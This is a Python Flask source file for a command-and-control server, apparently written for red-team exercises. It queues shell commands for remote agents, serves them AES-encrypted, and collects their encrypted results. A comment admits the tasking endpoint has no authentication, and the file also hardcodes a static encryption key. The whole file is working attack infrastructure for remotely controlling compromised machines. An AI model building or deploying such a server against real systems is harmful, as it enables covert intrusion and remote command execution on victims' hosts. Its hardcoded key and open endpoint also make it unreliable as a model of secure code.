from flask import Flask, request, jsonify
from Cryptodome.Cipher import AES
from Cryptodome.Util.Padding import pad, unpad
import base64

# This MUST be exactly 16, 24, or 32 bytes long
SECRET_KEY = b'SixteenByteKey!!' 

def encrypt_msg(plaintext):
    # Create a new cipher object with a random IV
    cipher = AES.new(SECRET_KEY, AES.MODE_CBC)
    # Pad the plaintext to match AES block size and encrypt
    ct_bytes = cipher.encrypt(pad(plaintext.encode(), AES.block_size))
    # Combine IV + Ciphertext and encode to Base64 (since we are sending this over HTTP, base64 is preferred)
    return base64.b64encode(cipher.iv + ct_bytes).decode('utf-8')

def decrypt_msg(encoded_ciphertext):
    # Decode from Base64
    raw = base64.b64decode(encoded_ciphertext)
    # Extract the first 16 bytes (the IV) and the rest (the message)
    iv = raw[:16]
    ciphertext = raw[16:]
    cipher = AES.new(SECRET_KEY, AES.MODE_CBC, iv)
    # Decrypt and remove padding
    return unpad(cipher.decrypt(ciphertext), AES.block_size).decode('utf-8')

app = Flask(__name__)

# Dictionary for storing tasks for each agent. I will be replacing this with a database in the future
# Key: Agent ID, Value: The command to run
task_queue = {
    "agent_001": "whoami" # A default task for our first test
}

# Endpoint 1: The Agent calls this to get a task
@app.route('/get_task/<agent_id>', methods=['GET'])
def get_task(agent_id):
    # Check if we have a task for this specific agent
    task = task_queue.get(agent_id, "nop")
    
    # Once the task is grabbed, we clear the queue so it doesn't run twice
    task_queue[agent_id] = "nop"
    encrypted_payload = encrypt_msg(task)
    return jsonify({"task": encrypted_payload})

# Endpoint 2: The Agent calls this to send back results
@app.route('/post_result/<agent_id>', methods=['POST'])
def post_result(agent_id):
    encrypted_data = request.json.get("result")
    try:
        decrypted_result = decrypt_msg(encrypted_data)
        print(f"\n[+] Decrypted Result from {agent_id}:")
        print(decrypted_result)
    except Exception as e:
        print(f"[-] Failed to decrypt result: {e}")
    
    return jsonify({"status": "success"})

# 3. Endpoint 3: Red team endpoint to send commands to agents
# I need to add some layer of security so blue team can't just send commands to the agents
@app.route('/set_task/<agent_id>', methods=['POST'])
def set_task(agent_id):
    new_command = request.json.get("command")
    task_queue[agent_id] = new_command
    print(f"[*] Task queued for {agent_id}: {new_command}")
    return jsonify({"status": "queued"})

if __name__ == '__main__':
    # Running on port 5000
    app.run(host='0.0.0.0', port=5000)